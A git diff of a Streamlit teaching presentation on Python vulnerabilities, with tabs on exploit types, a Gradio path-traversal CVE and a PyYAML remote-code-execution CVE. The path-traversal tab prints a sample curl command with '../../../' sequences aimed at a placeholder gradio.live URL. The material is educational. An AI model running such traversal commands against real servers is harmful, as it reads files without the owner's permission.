@@ -5,77 +5,48 @@ from streamlit_ace import st_ace
 st.set_page_config(
     layout="wide",
 )
-tab1, tab3, tab4  = st.tabs(["vulnerabilities & exploits", "path traversal", "remote code execution"])
-# taken from edx:
-#A vulnerability is a flaw in a system's design,
-#implementation or operation,
-#that can be exploited to violate
-#the system's security policy.
+tab1, tab2, tab3  = st.tabs(["vulnerabilities & exploits", "path traversal", "remote code execution"])
 
-# bugs:
-#That's well and good, except bugs are usually
-#perceived to be implementation mistakes.
-#In fact, systems can and do have bugs
-#in the way they're designed and used as well.
-
-# exploits
-#An exploit leverages a vulnerability
-#to violate a system's security policy.
-#So while a vulnerability is the actual
-#problem with the system,
-#an exploit is what takes advantage
-#of that problem, usually with malicious intent.
 
 with tab1:
-    st.image("./pages/scripts/assets/vunerabilityvsbug.jpeg")
-#visualisation breakage in thinking process, and breackage in coding process (system design vs implementation)
-#continue exploit -> search and using breakacge in thinking
-#what are vulnerabilities vs bugs 
-    st.markdown(
-"""
-## Exploits
-examples:
-
-- SQL Injection Exploits:
-    - badly sanitized input for queries
-    - 2014, the Heartbleed vulnerability in OpenSSL allowed attackers to exploit a flaw in the implementation of the TLS protocol, leading to the exposure of sensitive information, including private keys, usernames, and passwords.
-    - In Python: CVE-2022-34265, django had two functions (trunc and extract) that had this
-""")
-    st.image("./pages/scripts/assets/SQL_injection.png")
-    st.markdown("""
-- Buffer Overflow Exploits:
-    - often caused by vulnerability in input validation
-    - uses large input size to exceed memory and access areas beyond the buffer
-    - 2003, the SQL Slammer worm exploited a buffer overflow vulnerability in Microsoft SQL Server to spread rapidly across the internet
-    - In Python: CVE-2021-3177, the c-code below python could be reached and attacked with a buffer overflow attack
-
-- Denial of Service (DoS) and Distributed Denial of Service (DDoS) Exploits:
-    - overload a service with a massive amount of accesses
-    - 2016, the Mirai botnet launched a series of massive DDoS attacks disrupting internet services for millions of users by overwhelming DNS servers with a flood of malicious traffic.
-    - In Python: CVE-2021-3737, a HTTP-client could be sent into a infinite loop
     
-- Remote Code Execution (RCE) Exploits:
-    - execute arbitrary code on another machine
-    - 2017, the WannaCry ransomware exploited a vulnerability in the Windows SMB protocol (EternalBlue), encrypting files and demanding ransom payments from affected users.
-
-- Path traversal or ../ 
-    - are a type of web security vulnerability that allows an attacker to access files or directories outside of the web server's root directory
-    - 2017, Equifax exposed the personal information of approximately 147 million people. The breach was attributed to a vulnerability in Apache Struts
-    """)
-
-
-with tab3:
     col1, col2 = st.columns(2)
-    # insert notification oder bild von cve?
+    with col1:
+        st.markdown(
+        """
+        ## Vulnerabilities, Bugs and Exploits in Python
+        """)
+        st.image("./pages/assets/vunerabilityvsbug.jpeg")
+        st.markdown(
+        """
+        - SQL Injection
+        - Buffer Overflow 
+        - Denial of Service (DoS) and Distributed Denial of Service (DDoS)
+        - Remote Code Execution (RCE)
+        - Path traversal or ../ 
+        """)
+
+    with col2:
+        st.markdown("#")
+        st.markdown("#")
+        st.markdown("#")
+        st.markdown("#")
+        st.markdown("#")
+        st.markdown("#")
+        st.markdown("#")
+        st.image("./pages/assets/SQL_injection.png")
+
+with tab2:
+    
+    col1, col2 = st.columns(2)
     
     with col1:
-        st.write("""
-         CVE-2023-51449\n
-        """)
+        st.image("./pages/assets/gradio_cve.png")
+        
         code_text = """ 
              import gradio as gr
 
-             demo_img = "./pages/scripts/assets/skull-and-crossbones.png"
+             demo_img = "./pages/assets/skull-and-crossbones.png"
              
              def show_image(img):
                  return img
@@ -104,33 +75,22 @@ with tab3:
             run_py_script("gradio_app.py")
 
     with col2:
+        dummy_cmd = st.text_input(label="file/path/from/gradio", placeholder = 'https://xxxxxx..xx.gradio.live/file=/tmp/gradio/xxxxx')
+        st.write("curl --list-only --path-as-is", dummy_cmd, "/../../../path/to/asset.jpeg --output /attacker/home/path/image_copy.jpeg")
         
-        dummy_cmd = "curl --list-only --path-as-is https://xxxxxx..xx.gradio.live/file=/tmp/gradio/xxxxx/../../../path/to/asset.jpeg --output /path/to/your/copy.jpeg"
-        st.write(dummy_cmd)
         content = st_ace(language='css', theme="terminal", wrap=True)
 
-        st.image("./pages/scripts/assets/gradio_demo.jpg")
-
-         
-##
-##"""
-##Storyline of gradio app vulnerability -> show code -> run code -> print console output to the presentation (but modified) 
-##-> send roman modified version and roman seemlingly inserts the modified version but actually inserts the real version 
-##(if quick might be enough if it is the real version)
-##steals the picture and then shows it on his PC -> large emoji or urlaubsbild
-##
-##idea to display -> show two consoles next to each other gradio app in python + output and linux terminal with curl command
-##-> out put = image with title stolen -> roman zeigt seins hoch in die camera
-##"""
+        st.image("./pages/assets/gradio_demo.jpg")
 
 
-with tab4:
+
+with tab3:
+    
     col1, col2 = st.columns(2)
 
     with col1:
-        st.write("""
-         CVE-2020-14343\n
-        """)
+        st.image("./pages/assets/yaml_cve.png")
+        
         code_text = """ 
             import yaml
             from yaml import FullLoader
